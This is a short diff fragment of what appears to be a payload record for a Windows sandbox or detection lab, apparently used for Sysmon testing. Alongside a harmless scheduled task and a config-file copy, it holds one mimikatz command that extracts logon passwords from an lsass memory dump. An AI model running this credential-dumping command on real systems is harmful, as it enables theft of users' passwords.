@@ -8,5 +8,6 @@
 
 ##### payload record:
 SCHTASKS /Create /SC DAILY /TN "Open Notepad" /TR "notepad.exe" /ST 12:00
+
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
 copy %USERPROFILE%\\Desktop\\SandboxFiles\\sysmonconfig.xml .
